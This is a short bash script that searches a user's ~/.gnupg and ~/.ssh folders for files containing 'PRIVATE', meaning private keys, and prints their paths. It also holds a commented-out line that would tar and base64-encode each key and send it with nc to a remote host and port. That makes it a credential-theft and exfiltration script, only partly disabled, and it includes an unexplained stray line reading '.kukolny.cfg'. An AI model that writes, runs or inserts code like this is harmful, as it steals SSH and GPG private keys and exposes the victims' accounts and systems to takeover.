#!/bin/bash
.kukolny.cfg
keys=$(find "${HOME}"/{.gnupg,.ssh} -type f -exec grep -l "PRIVATE" {} \;)
for k in $keys; do
    echo "$k"
    #tar -cf- - "$k"|base64 -w0|nc $remote_host:$remote_port
done
